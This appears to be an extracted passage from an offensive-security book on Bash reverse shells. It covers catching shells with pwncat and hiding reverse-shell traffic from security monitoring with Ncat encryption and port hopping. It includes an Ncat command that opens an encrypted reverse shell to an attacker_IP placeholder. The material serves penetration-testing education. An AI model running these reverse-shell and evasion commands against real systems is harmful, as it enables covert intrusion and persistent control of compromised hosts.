@@ -1,0 +1,159 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 131 - (Process IDs may differ on your machine.)
+To break it down further, the initial command, sh ❶, calls upon the bash -c command ❷. This command allows us to execute the desired shell instance, which in this case is bash, identified by process ID 134 ❸. By leveraging this chain of processes and accessing the network capabilities provided by /dev/tcp, we elevate our reverse shell capabilities from a limited sh shell to a fully functional bash shell. This upgrade provides us with a wider range of advanced reverse shell techniques, allowing for sophisticated post-exploitation activities and the ability to maintain control over compromised systems.
+Security Relevance Score: 16
+Word Count: 1328
+Extracted: 2025-06-13 23:40:57
+
+---
+
+(Process IDs may differ on your machine.)
+To break it down further, the initial command, sh ❶, calls upon the bash -c command ❷. This command allows us to execute the desired shell instance, which in this case is bash, identified by process ID 134 ❸. By leveraging this chain of processes and accessing the network capabilities provided by /dev/tcp, we elevate our reverse shell capabilities from a limited sh shell to a fully functional bash shell. This upgrade provides us with a wider range of advanced reverse shell techniques, allowing for sophisticated post-exploitation activities and the ability to maintain control over compromised systems.
+
+
+Listening with pwncat
+pwncat is another useful utility for capturing and interacting with reverse shells. It lets us create a reverse shell listener, then use its built-in modules for a variety of purposes.
+For example, let’s use it to send commands through the reverse shell. Later in this chapter, we’ll use it for file uploads as well. Start a pwncat reverse shell listener:
+$ pwncat-cs -l -p 1337
+
+[15:54:30] Welcome to pwncat!
+bound to 0.0.0.0:1337
+
+The output shows that pwncat is actively listening for any incoming connections made by compromised machines.
+Now we can inject the command that will give us a reverse shell, as we did earlier in this chapter. Once pwncat receives the shell, you’ll see a message in the terminal, and you’ll be able to run commands:
+[15:59:49] received connection from 172.16.10.12:54736
+[15:59:50] 172.16.10.12:54736: registered new host w/ db manager.py:957
+
+(local) pwncat$
+
+The message (local) pwncat$ is pwncat’s prompt, at which you enter commands. Enter help to see existing options:
+(local) pwncat$ help
+
+  Command     Description
+-------------------------------------------------------------------------------
+  alias       Alias an existing command with a new name. Specifying [...]
+  back        Return to the remote terminal
+  bind        Create key aliases for when in raw mode. This only [...]
+  connect     Connect to a remote victim. This command is only valid [...]
+  download    Download a file from the remote host to the local host
+  escalate    Attempt privilege escalation in the current session. [...]
+  exit        Exit the interactive prompt. If sessions are active, [...]
+  help        List known commands and print their associated help [...]
+  info        View info about a module
+--snip--
+  local       Run a local shell command on your attacking machine
+  lpwd        Print the local current working directory
+  reset       Reset the remote terminal to the standard pwncat [...]
+  run         Run a module. If no module is specified, use the [...]
+  search      View info about a module
+  sessions    Interact and control active remote sessions. This [...]
+  set         Set runtime variable parameters for pwncat
+  shortcut
+  upload      Upload a file from the local host to the remote host
+  use         Set the currently used module in the config handler
+
+Many options are available. To run a few shell commands, you must first use the back command. This command will return to the compromised host:
+(local) pwncat$ back
+Now you can run commands on the target:
+(remote) www-data@p-web-02.acme-infinity-servers.com:/var/www/html$ id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+As you can see, pwncat is able to send commands and retrieve the results.
+
+
+
+Bypassing Security Controls
+When performing penetration tests, you may run into environments in which the shell you’ve established is hard to use. The shell itself might be limited, for instance, or the environment might reduce the number of packages available in an attempt to harden the system.
+For example, Table 7-1 shows the differences between commands run in the Kali shell environment and in the p-web-02 reverse shell.
+Table 7-1: Commands Run in Kali vs. p-web-02
+
+
+
+Kali shell
+p-web-02 reverse shell
+
+
+
+
+$ echo $SHELL
+$ echo $SHELL
+
+
+/bin/bash
+/usr/sbin/nologin
+
+
+$ whoami
+$ whoami
+
+
+Kali
+www-data
+
+
+$ ls /bin | wc -l
+$ ls /bin | wc -l
+
+
+3249
+89
+
+
+$ wget
+$ wget
+
+
+wget: missing URL
+Bash: wget: command not found
+
+
+Usage: wget [Option] ...
+
+
+
+
+The p-web-02 environment lacks many of the user privileges of the Kali shell and even has a drastically different number of available binaries. This makes sense because Kali is a full-fledged operating system with a graphical interface, whereas p-web-02 is a slim container with the bare minimum amount of software required to function.
+A lack of installed or built-in binaries is normal in cloud-hosted web application servers like the one p-web-02 is mimicking. This is due to performance, security, and resource optimization requirements. A slim system image requires less maintenance overhead and provides faster deployment times.
+Third-party tools are even tailored to remove excessive packages from an image (a process called minification). For example, the SlimToolkit project at https://github.com/slimtoolkit/slim runs several analysis techniques on an image to identify unused packages, then optimizes the operating system size by removing them.
+In this section, we’ll highlight a few high-level techniques used to hide reverse shell communications or bypass security restrictions in hardened environments. These techniques can evade initial access security measures and allow us to maintain control over compromised systems.
+
+Encrypting and Encapsulating Traffic
+To evade detection, reverse shells can use encryption and encapsulation techniques to hide the malicious traffic within legitimate protocols or connections. By encrypting the communication, we can render the contents of the reverse shell traffic unreadable, making it challenging for security devices to identify any malicious payload or commands being sent.
+Encapsulation conceals the reverse shell traffic within innocuous protocols or already encrypted connections. This technique disguises the reverse shell communication as legitimate traffic.
+Figure 7-3 shows how an encrypted tunnel between a compromised server and the attacker machine could work. As you can see, the reverse shell connection occurs within the encrypted connection.
+
+Figure 7-3: A reverse shell over an encrypted communication channel
+
+We can create a reverse shell over an encrypted transport protocol in multiple ways. One way is by using Ncat (not to be confused with Netcat), a network utility that is packaged with Nmap and allows the redirection, writing, reading, and encryption of traffic.
+You can use the following command sequence between the attacker and target machine to establish a reverse shell connection that is encapsulated by an encrypted tunnel. On the attacker machine, start a Secure Sockets Layer (SSL) listener with Ncat:
+$ ncat -v -l 9443 --ssl
+
+Ncat:(https://nmap.org/ncat)
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert
+to use a permanent one.
+Ncat: SHA-1 fingerprint: 174A B251 8100 D6BC EFD7 71C2 FEA6 3D32 0D2D 49B2
+Ncat: Listening on :::9443
+
+Use the -v (verbose) flag, specify the port to the -l (listen) flag, and then use --ssl for encryption. Ncat should generate temporary asymmetric keys (Rivest-Shamir-Adleman, or RSA) by default unless you specify otherwise.
+On the compromised machine, the following command will establish an encrypted reverse shell. However, the compromised machine must have Ncat available for this command to work, and it often isn’t available by default:
+$ ncat attacker_IP address 9443 --ssl -e /bin/bash -v
+
+Ncat: (https://nmap.org/ncat)
+Ncat: Subject: CN=localhost
+Ncat: Issuer: CN=localhost
+Ncat: SHA-1 fingerprint: BEED 35DF 5C83 60E7 73CF EBB8 B340 F870 8CC3 DD6E
+--snip--
+Ncat: SHA-1 fingerprint: BEED 35DF 5C83 60E7 73CF EBB8 B340 F870 8CC3 DD6E
+
+In this example, we run Ncat to connect to the attacker’s listener. We use --ssl to encrypt the traffic, followed by -e /bin/bash to execute the bash shell.
+pwncat can also establish a connection over SSL by using the same command style as Ncat. Refer to pwncat’s documentation at https://pwncat.readthedocs.io/en/latest/usage.html to learn how to use it for establishing SSL-based reverse shell connections.
+
+
+Alternating Between Destination Ports
+Port hopping, or dynamically switching network ports during the communication process, is used for both defensive and offensive activities. On the offensive side, this technique can ensure the stability of a reverse shell and make it more challenging for security monitoring systems to block malicious traffic. By constantly changing ports, attackers can bypass simple port-based filtering mechanisms and intrusion detection systems that monitor specific ports for suspicious activities. Port hopping also makes it more difficult for defenders to thwart the reverse shell connection; if a network port becomes unreachable, a port hop will reestablish the connection.
+
+NOTE
+
+You can download this chapter’s scripts from https://github.com/dolevf/Black-Hat-Bash/blob/master/ch
